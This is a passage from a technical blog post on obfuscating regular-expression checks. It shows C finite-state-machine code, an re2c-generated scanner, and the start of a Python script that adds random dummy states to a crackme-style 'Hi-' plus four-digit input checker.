</span><span class='line'>            <span class="k">case</span> <span class="mi">2</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">3</span> <span class="p">...</span> <span class="mi">6</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">s</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">7</span>:
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Automatically</h2>

<p>But what if our regex was totally more complex ? It would be a hell to implement manually the FSM. That&rsquo;s why I wanted to find some ways to generate your own FSM from a regex string manipulation.</p>

<h3>With re2c</h3>

<p><a href="http://re2c.org/manual.html">re2c</a> is a cool and simple tool that allows you to describe your regex in a C comment, then it will generate the code of the scanner. As an example, here is the source code to generate the scanner for the previous regex:</p>

<figure class='code'><figcaption><span> (fsm_re2c_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_re2c_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* re2c -i fsm_re2c_example.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'><span class="cm">/*!re2c</span>
</span><span class='line'><span class="cm">    re2c:define:YYCTYPE = &quot;char&quot;;</span>
</span><span class='line'><span class="cm">    re2c:define:YYCURSOR = s;</span>
</span><span class='line'><span class="cm">    re2c:define:YYMARKER = q;</span>
</span><span class='line'><span class="cm">    re2c:yyfill:enable   = 0;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">   &quot;Hi-&quot;[0-9]{4}  { return 1; }</span>
</span><span class='line'><span class="cm">   [^]            { return 0; }</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once you feed that source to re2c, it gives you that scanner ready to be compiled:</p>

<figure class='code'><figcaption><span> (fsm_re2c_generated_non_optimized.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_re2c_generated_non_optimized.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* Generated by re2c 0.13.5 on Sun Aug 25 00:27:48 2013 */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">yych</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;H&#39;</span>:       <span class="k">goto</span> <span class="n">yy2</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy4</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy2:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="o">++</span><span class="n">s</span><span class="p">);</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;i&#39;</span>:       <span class="k">goto</span> <span class="n">yy5</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy3:</span>
</span><span class='line'>        <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="nl">yy4:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'><span class="nl">yy5:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;-&#39;</span>:       <span class="k">goto</span> <span class="n">yy7</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy6:</span>
</span><span class='line'>        <span class="n">s</span> <span class="o">=</span> <span class="n">q</span><span class="p">;</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'><span class="nl">yy7:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy8</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy8:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy9</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy9:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy10</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy10:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy11</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy11:</span>
</span><span class='line'>        <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="p">{</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Cool isn&rsquo;t it ? But in fact, if you try to compile and Hexrays it (even with optimizations disabled) you will be completely disappointed: it gets simplified like <strong>really</strong> ; not cool for us (cool for the reverse-engineer though!).</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/hexrays.png"></p>

<h3>By hand</h3>

<p>That&rsquo;s why I tried to generate myself the C code of the scanner. The first thing you need is a <a href="http://osteele.com/software/python/fsa/reCompiler.html">&ldquo;regular-expression string&rdquo; to FSM Python library</a>: a sort-of regex compiler. Then, once you are able to generate a FSM from a regular expression string, you are totally free to do whatever you want with the automaton. You can obfuscate it, try to optimize it, etc. You are also free to generate the C code you want.
Here is the ugly-buggy-PoC code I wrote to generate the scanner for the regex used previously:</p>

<figure class='code'><figcaption><span> (generate_c_fsm.py)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/generate_c_fsm.py'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">import</span> <span class="nn">reCompiler</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">random</span>
</span><span class='line'>
</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="s">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s">]^_`{|}~ </span><span class="se">\t\n\r\x0b\x0c</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">fsm</span> <span class="o">=</span> <span class="n">reCompiler</span><span class="o">.</span><span class="n">compileRE</span><span class="p">(</span><span class="s">&#39;Hi-[0-9][0-9][0-9][0-9]&#39;</span><span class="p">,</span> <span class="n">minimize</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">states</span> <span class="o">=</span> <span class="n">fsm</span><span class="o">.</span><span class="n">states</span>
</span><span class='line'><span class="n">transitions</span> <span class="o">=</span> <span class="n">fsm</span><span class="o">.</span><span class="n">transitions</span>
</span><span class='line'>
</span><span class='line'><span class="n">useless_states</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">100</span><span class="p">))]</span>
</span><span class='line'><span class="n">states</span> <span class="o">+=</span> <span class="n">useless_states</span>
</span><span class='line'>
</span><span class='line'><span class="c"># We don&#39;t want to have dead nodes, so let&#39;s create transition</span>
</span><span class='line'><span class="n">deadnodes</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">useless_states</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">deadnodes</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">states</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">states</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span><span class='line'>    <span class="n">transitions</span> <span class="o">+=</span> <span class="p">[(</span><span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">t</span><span class="p">)]</span>
</span><span class='line'>    <span class="n">deadnodes</span> <span class="o">-=</span> <span class="nb">set</span><span class="p">([</span><span class="n">s</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="c"># To obfuscate we can use random state number</span>
</span><span class='line'><span class="n">dic_states</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span>
</span><span class='line'>    <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">states</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">states</span><span class="p">)</span>
</span><span class='line'><span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">dic_states</span><span class="o">.</span><span class="n">values</span><span class="p">())</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">dic_states</span><span class="o">.</span><span class="n">values</span><span class="p">())))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;unsigned char checkinput(char *p){</span><span class="se">\n</span><span class="s">unsigned int state = </span><span class="si">%d</span><span class="s">;</span><span class="se">\n</span><span class="s">while(*p)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">switch(state)</span><span class="se">\n</span><span class="s">{&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">fsm</span><span class="o">.</span><span class="n">initialState</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">states</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">fsm</span><span class="o">.</span><span class="n">finalStates</span><span class="p">:</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;case </span><span class="si">%d</span><span class="s">:</span><span class="se">\n</span><span class="s">{&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
